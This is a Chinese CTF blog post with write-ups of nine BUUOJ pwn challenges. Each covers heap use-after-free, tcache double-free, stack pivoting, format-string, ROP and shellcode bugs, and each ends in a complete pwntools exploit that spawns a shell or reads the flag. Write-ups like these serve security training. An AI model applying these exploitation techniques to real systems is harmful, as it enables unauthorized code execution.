<h3 id="十七、ciscn-2019-n-3"><a href="#十七、ciscn-2019-n-3" class="headerlink" title="十七、ciscn_2019_n_3"></a>十七、ciscn_2019_n_3</h3><p>照例checksec一下</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505110425-1620522753562.png"></p>
<p>开启了nx和canary，relro只开启部分，可以修改got表（后面没用到就是了）</p>
<p>进入ida看看反汇编代码</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505110633-1620522770994.png"></p>
<p>总共有着四个功能，第一个new note：</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505110745.png"></p>
<p>在第一个功能里面，可以创建一个堆，堆里面第一个存放的是printf函数指针，第二存放了一个free函数指针，第三个存放有区别，当type==1，存放的是一个数据，type ==2，存放的是字符串的地址。然后这个字符串的真正位置存放在又生成的一个堆里面。</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505111350.png"></p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505111403.png"></p>
<p>free函数里面并未将指针置空，存在uaf漏洞。</p>
<p>另外三个功能，一个是调用printf函数指针，打印出一串字符串，一个是调用free函数指针，还有一个就是打印没什么意义的字符串</p>
<p>在函数表里面，我们可以看见，system函数被调用过了，也就是接下来就是/bin/sh以及调用的问题，这里我们选择在函数指针做手脚，因为函数指针未置空，我们只需要把free函数指针改为指向system的地址，然后再对释放的内容修改为/bin/sh的地址，就能让调用free(ptr)变成system(“/bin/sh”)，这边由于输入长度问题，写的是/sh字符串。</p>
<p>那该怎么修改呢？利用fastbin attack，首先创建两个chunk（type==2的，chunk0和chunk1）创建的chunk都是固定大小为0xc的chunk，后面我们能控制大小的chunk随便写一个大小即可（不能为0xc！其他都行）。然后释放掉这两个chunk，再申请一个chunk3，我们能控制大小的chunk也要设置大小也为0xc，由于LIFO，那么程序创建的chunk将会被分配到第二个被释放的chunk1的位置，我们能控制大小的chunk就会被分配到第一个释放的chunk0的位置，而我们又能对这个chunk进行输入，所以把”sh\x00\x00”+p32(system)输入即可，最后再释放掉调用函数</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505112805.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,27753)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx,num,size,value</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Type &gt;&quot;</span>,<span class="hljs-built_in">str</span>(num))<br>	<span class="hljs-keyword">if</span> num==<span class="hljs-number">1</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<span class="hljs-keyword">else</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Length &gt;&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">purchase</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">&quot;sh\x00\x00&quot;</span>+p32(system))<br>gdb.attach(p,<span class="hljs-string">&#x27;b*main&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)   <span class="hljs-comment">#uaf</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十八、ciscn-2019-final-3"><a href="#十八、ciscn-2019-final-3" class="headerlink" title="十八、ciscn_2019_final_3"></a>十八、ciscn_2019_final_3</h3><p>常规checksec一下</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505113309.png"></p>
<p>保护全开了，拖进ida看看反汇编代码吧</p>
<img src="2021-05-05-buu04.assets/QQ图片20210505202136.png"  />

<p>c++代码写的，不过功能很简单，就两个选择，先看第一个吧</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505202251.png"></p>
<p>最多可以创建二十四个不同的索引，堆的大小最大不能超过0x78，被限制只有fast chunk大小，然后我们在创建之后还能往堆上输入数据，最后，printf了堆的地址出来。</p>
<p>第二个功能更简单</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505202536.png"></p>
<p>释放掉索引对应的堆块，并且可以发现，并未将堆指针置空，存在uaf漏洞。在找找其他地方，发现没有存在后门函数。那只能走泄露libc了，然后劫持hook函数。</p>
<p>要泄露libc，就要有被释放的unsorted bin，这里限制了chunk的大小，那我们就要去修改chunk size，将其修改为比0x410大的数，因为题目环境为libc-2.27.so，存在tcache。</p>
<p>先创建许多堆块（后面再解释为什么创建这么多个），然后释放同一个堆块，因为存在tcache，所以可以直接释放两次</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505203105.png"></p>
<p>出现了循环指向，这时候我们在申请同样大小的堆块，这里是要申请三次，第三次chunk生成的地方（选择生成在chunk0的size处，修改他的值），才是我们要的。首先是指向自身，当我们第一次申请时，通过输入把fd修改为指向chunk0</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505203355.png"></p>
<p>这是第一次申请，可以看到，chunk0地址出现了</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505203604.png"></p>
<p>这是第二次申请，只剩下chunk0，那第三次申请就能让chunk出现在chunk0位置，然后修改其size的大小，这边我是修改为0x420</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505203733.png"></p>
<p>然后把这个堆块释放掉，就会出现libc了，这边解释为什么要申请很多的堆块，因为你要修改为0x420，如果申请的堆块没有大于0x420，那这个堆块会一直处于free的状态的，他要有那么大的size，才能成为0x420的chunk，所以我们申请的堆块会先被并入这个大chunk里面。</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505204038.png"></p>
<p>释放完后出现了libc中的地址，接下来就泄露了。因为题目里面只能泄露出堆块的地址，所以我们要想办法让在这个地址申请chunk。这边因为这个0x420的chunk是由许多chunk合并的，我们把chunk1释放了，再申请一个大小和chunk0一样的堆块，就可以让chunk1能够重叠在fd的位置</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210505204421.png"></p>
<p>可以看到，0x20大小的tcache_entry出现了类似前面的重复释放的样式，所以也是申请堆块，然后在libc地址生成chunk，再将其泄露。之后就是劫持hook了，以上的就是这题的点了，后面不多说了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25609</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,write</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;something&quot;</span>,write)<br>	p.recvuntil(<span class="hljs-string">&quot;gift :&quot;</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>ptr0=add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ptr0)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#4</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#5 </span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#6</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#7 </span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#9 </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#10</span><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#11</span><br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#12</span><br><br>remove(<span class="hljs-number">12</span>)<br>remove(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>))<br>remove(<span class="hljs-number">0</span>)<br>remove(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>libc_base=add(<span class="hljs-number">18</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)-<span class="hljs-number">0x3ebca0</span><br>__malloc_hook=libc_base+__malloc_hook<br>one_gadget=libc_base+<span class="hljs-number">0x10a38c</span><br>log.info(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>log.info(<span class="hljs-string">&quot;__malloc_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(__malloc_hook))<br>log.info(<span class="hljs-string">&quot;one_gadget: &quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br>remove(<span class="hljs-number">3</span>)<br>remove(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x70</span>,p64(one_gadget))<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b*main&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-string">&#x27;22&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-string">&#x27;0x30&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十九、ciscn-2019-s-4"><a href="#十九、ciscn-2019-s-4" class="headerlink" title="十九、ciscn_2019_s_4"></a>十九、ciscn_2019_s_4</h3><p>这题好像之前有过？所以这里就不再多说了，栈迁移的题目，直接贴exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29292</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;beef&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;beef&quot;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br>payload=(<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">1</span>)+p32(s_buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十、jarvisoj-fm"><a href="#二十、jarvisoj-fm" class="headerlink" title="二十、jarvisoj_fm"></a>二十、jarvisoj_fm</h3><p>一道很平常的格式化字符串的题目，就直接给exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25092</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>x=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x)+<span class="hljs-string">&#x27;%11$n&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十一、-HarekazeCTF2019-baby-rop2"><a href="#二十一、-HarekazeCTF2019-baby-rop2" class="headerlink" title="二十一、[HarekazeCTF2019]baby_rop2"></a>二十一、[HarekazeCTF2019]baby_rop2</h3><p>一道常规rop题目，除了这题printf会出现下图的匹配不到libc之外，其他没什么，而对于这个，只要换个函数，我这边用read，就可以了。噢，还有！目录里面没有flag</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210506220516.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26933</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400733</span><br>ret=<span class="hljs-number">0x4004d1</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&#x27;name? &#x27;</span>,payload)<br>p.recvline()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十二、ez-pz-hackover-2016"><a href="#二十二、ez-pz-hackover-2016" class="headerlink" title="二十二、ez_pz_hackover_2016"></a>二十二、ez_pz_hackover_2016</h3><p>常规checksec一下，查看保护机制</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509091010.png"></p>
<p>nx都没开，应该是注入shellcode来getshell了，进入ida看看代码</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509091119.png"></p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509091125.png"></p>
<p>确实，没给后门函数，nx没开，应该就是注入shellcode了，我们看看代码，首先题目先把s的在栈上的地址泄露出来了，后面则需要绕过crashme，这个简单，先输入这个，加上\x00让strcmp检验通过，之后，在vuln里面的memcpy存在着溢出，里面的栈比较小，而外面的栈较大，可以写入shellcode，接下就计算shellcode的地址，以及溢出点的偏移距离，这边有坑的就是IDA里面的偏移是错的，我们需要进入gdb动调试进行找寻地址以及偏移距离</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509091757.png"></p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509091821.png"></p>
<p>我们泄露的地址距离字符串起始地址0xffc445f0相减之后，相差0x1c</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509092023.png"></p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509092054.png"></p>
<p>垃圾字符串偏移是18，但是我们还输入了crashme\x00，所以总的偏移是26个。之后就是return to shellcode了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,29815)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>s_buf=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(s_buf)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">&quot;crashme\x00&quot;</span>.ljust(<span class="hljs-number">26</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf-<span class="hljs-number">0x1c</span>)+shellcode<br>p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十三、-Black-Watch-入群题-PWN"><a href="#二十三、-Black-Watch-入群题-PWN" class="headerlink" title="二十三、[Black Watch 入群题]PWN"></a>二十三、[Black Watch 入群题]PWN</h3><p>常规checksec一下</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509171725.png"></p>
<p>只开启了nx保护，进入ida看看代码</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509171818.png"></p>
<p>给了两次输入，第一次在.bss段上，第二次是栈，栈上的只够覆盖到返回地址，但是.bss却可以输入大量数据，所以要劫持栈到.bss进行rop，所以要让ebp的值为s的地址，返回地址为leave，把栈劫持到.bss上，其他剩下就是常规的rop</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26260</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>leave_ret=<span class="hljs-number">0x8048408</span><br>s_buf=<span class="hljs-number">0x0804A300</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>,payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(write)<br>libc=LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(system)+p32(main)+p32(binsh)<br>p.recv()<br>p.send(payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.recv()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十四、jarvisoj-tell-me-something"><a href="#二十四、jarvisoj-tell-me-something" class="headerlink" title="二十四、jarvisoj_tell_me_something"></a>二十四、jarvisoj_tell_me_something</h3><p>这题，进入ida里面</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509174709.png"></p>
<p>有个这个函数，可以看见，已经读取了flag，并且还会将其输出，并且main函数有溢出点，跳转到这，再接收flag即可</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!usr/bin/env python<br>#coding=utf-8<br>from pwn import *<br>p=remote(&#x27;node3.buuoj.cn&#x27;,28478)<br>context.log_level=&#x27;debug&#x27;<br>payload=&#x27;a&#x27;*0x88+p64(0x400620)<br>p.sendlineafter(&quot;message:&quot;,payload)<br>p.recvline()<br>p.recvall()<br></code></pre></td></tr></table></figure>

<h3 id="二十五、gwctf-2019-easy-pwn"><a href="#二十五、gwctf-2019-easy-pwn" class="headerlink" title="二十五、gwctf_2019_easy_pwn"></a>二十五、gwctf_2019_easy_pwn</h3><p>照例checksec</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509181618.png"></p>
<p>只开启了nx，进入ida发现是c++写的，看不懂。。。</p>
<img src="2021-05-05-buu04.assets/QQ图片20210509181725.png" style="zoom:80%;" />

<p>直接输入是不够溢出的，然后往下看，发现还有个strcpy，可能可以溢出，但是v4不知道咋来的，然后就跑去百度了（真没志气，hh），发现其实能看懂应该很简单，不过可能就是为了让人看不懂吧，嗯，应该要学c++了！（下次一定）</p>
<p>这边是I可以被替换为pretty，所以填入I，被转换溢出，而跳转进行rop</p>
<p><img src="2021-05-05-buu04.assets/QQ%E5%9B%BE%E7%89%8720210509181629.png"></p>
<p>明白这个，其他也就没什么了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26014</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=<span class="hljs-number">0x8049091</span><br><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(puts_plt)+p32(main)+p32(puts_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;pretty&#x27;</span>*<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">12</span>)<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>one_gadget=puts-<span class="hljs-number">0x05f140</span>+<span class="hljs-number">0x5f066</span><br><span class="hljs-comment">#system=puts-0x24800</span><br><span class="hljs-comment">#binsh=puts+0xf9eeb</span><br><span class="hljs-comment">#payload=&#x27;I&#x27;*16+p32(system)+&#x27;dead&#x27;+p32(binsh)</span><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(one_gadget)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

